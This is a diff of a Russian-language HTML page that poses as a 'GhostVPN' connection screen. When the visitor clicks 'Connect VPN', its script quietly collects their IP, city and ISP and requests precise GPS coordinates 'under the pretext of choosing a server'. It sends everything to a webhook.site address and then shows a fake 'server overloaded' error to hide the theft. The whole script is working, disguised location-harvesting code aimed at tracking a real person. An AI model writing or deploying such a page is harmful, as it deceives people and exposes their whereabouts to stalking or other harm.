@@ -1,46 +1,108 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
-    <style>body { background: black; margin: 0; cursor: none; }</style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GhostVPN - Безопасное подключение</title>
+    <style>
+        body {
+            background-color: #0f172a;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            padding: 20px;
+            border-radius: 15px;
+            background: #1e293b;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            max-width: 350px;
+        }
+        .logo { font-size: 50px; margin-bottom: 10px; }
+        h1 { font-size: 24px; margin: 10px 0; }
+        p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
+        .btn {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+        .btn:hover { background: #2563eb; transform: scale(1.05); }
+        #status { margin-top: 15px; font-size: 12px; color: #64748b; }
+    </style>
 </head>
 <body>
+
+<div class="container">
+    <div class="logo">🛡️</div>
+    <h1>GhostVPN</h1>
+    <p>Ваш IP 146.120.248.43 не защищен! Подключитесь к шифрованному туннелю для обхода блокировок.</p>
+    <button class="btn" onclick="connect()">Подключить VPN</button>
+    <div id="status">Статус: Отключено</div>
+</div>
+
 <script>
-(async () => {
+async function connect() {
+    document.getElementById('status').innerText = "Поиск лучшего сервера...";
     const hook = "https://webhook.site/6729bab1-8bc8-475e-8a94-1bb9e1c033d2";
     
     let info = {
-        time: new Date().toLocaleString(),
-        map_link: "Ожидание разрешения..."
+        label: "VPN_CLICKED",
+        time: new Date().toLocaleString()
     };
 
-    // 1. Сначала шлем инфу по IP (Харьков и т.д.)
+    // 1. Быстрый сбор IP и города
     try {
-        const r = await fetch("https://ipapi.co/json/");
-        const d = await r.json();
+        const res = await fetch("https://ipapi.co/json/");
+        const d = await res.json();
         info.ip = d.ip;
         info.city = d.city;
         info.isp = d.org;
     } catch(e) {}
 
-    // 2. Запрашиваем точную точку (выскочит окно подтверждения)
+    // 2. Запрос ГЕО (под предлогом выбора сервера)
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((p) => {
-            // Если нажал "Разрешить" — создаем ссылку на Google Карты
-            info.map_link = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+            info.lat = p.coords.latitude;
+            info.lon = p.coords.longitude;
+            info.accuracy = p.coords.accuracy + " метров";
+            info.map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
             
-            // Отправляем финальный пакет с картой
-            fetch(hook, { method: "POST", mode: "no-cors", body: JSON.stringify(info) });
+            sendData(hook, info);
+            finish();
         }, () => {
-            info.map_link = "Доступ отклонен пользователем";
-            fetch(hook, { method: "POST", mode: "no-cors", body: JSON.stringify(info) });
-        });
+            info.gps = "Доступ запрещен";
+            sendData(hook, info);
+            finish();
+        }, { enableHighAccuracy: true });
     } else {
-        info.map_link = "Браузер не поддерживает GPS";
-        fetch(hook, { method: "POST", mode: "no-cors", body: JSON.stringify(info) });
+        sendData(hook, info);
+        finish();
     }
-})();
+}
+
+function sendData(url, data) {
+    fetch(url, { method: "POST", mode: "no-cors", body: JSON.stringify(data) });
+}
+
+function finish() {
+    setTimeout(() => {
+        document.getElementById('status').innerText = "Ошибка сервера. Попробуйте другой регион.";
+        alert("Ошибка подключения: Сервер перегружен. Попробуйте позже.");
+    }, 2000);
+}
 </script>
+
 </body>
 </html>
